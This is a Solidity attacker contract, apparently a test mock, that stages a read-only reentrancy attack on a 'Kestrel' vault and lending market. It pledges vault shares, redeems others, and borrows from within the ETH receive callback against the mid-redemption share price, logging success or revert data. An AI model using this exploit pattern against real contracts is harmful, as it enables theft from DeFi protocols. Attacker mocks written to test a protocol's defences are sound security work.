// SPDX-License-Identifier: MIT
pragma solidity 0.8.37;

import { IERC20 } from "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import { KestrelVault } from "kestrel/KestrelVault.sol";
import { KestrelLending } from "kestrel/KestrelLending.sol";

/// @notice SC08 attacker: pledges vault shares as collateral, then redeems other shares. The
///         ETH from the redemption lands in {receive}, which reenters the lending market and
///         borrows against the share price read in the middle of the redemption.
contract ReadOnlyReentrancyAttacker {
    /// @notice Target vault.
    KestrelVault public immutable vault;
    /// @notice Target lending market.
    KestrelLending public immutable lending;
    /// @notice Debt token borrowed.
    IERC20 public immutable debt;

    /// @notice Debt to borrow inside the callback.
    uint256 public borrowTarget;
    /// @notice Whether the callback already tried to borrow.
    bool public attempted;
    /// @notice Whether the callback's borrow succeeded.
    bool public borrowed;
    /// @notice Revert data of the callback's borrow, when it failed.
    bytes public lastError;

    /// @param _vault Target vault.
    /// @param _lending Target lending market.
    /// @param _debt Debt token.
    constructor(KestrelVault _vault, KestrelLending _lending, IERC20 _debt) {
        vault = _vault;
        lending = _lending;
        debt = _debt;
    }

    /// @notice Deposit `amount` of this contract's ETH for shares.
    /// @param amount Wei to deposit.
    function depositToVault(uint256 amount) external {
        vault.deposit{ value: amount }(address(this), 0);
    }

    /// @notice Pledge `shares` of vault collateral to the lending market.
    /// @param shares Shares to pledge.
    function pledge(uint256 shares) external {
        IERC20(address(vault)).approve(address(lending), shares);
        lending.depositVaultCollateral(shares);
    }

    /// @notice Redeem `shares`, triggering the reentrancy in {receive}.
    /// @param shares Vault shares to redeem.
    /// @param _borrowTarget Debt amount to borrow inside the callback.
    function run(uint256 shares, uint256 _borrowTarget) external {
        borrowTarget = _borrowTarget;
        vault.redeem(shares, address(this));
    }

    /// @notice Redemption callback: try once to borrow against the mid-redemption share price,
    ///         recording why it failed if it does (so the redemption itself still completes).
    receive() external payable {
        if (!attempted && borrowTarget > 0) {
            attempted = true;
            try lending.borrow(borrowTarget) {
                borrowed = true;
            } catch (bytes memory reason) {
                lastError = reason;
            }
        }
    }
}
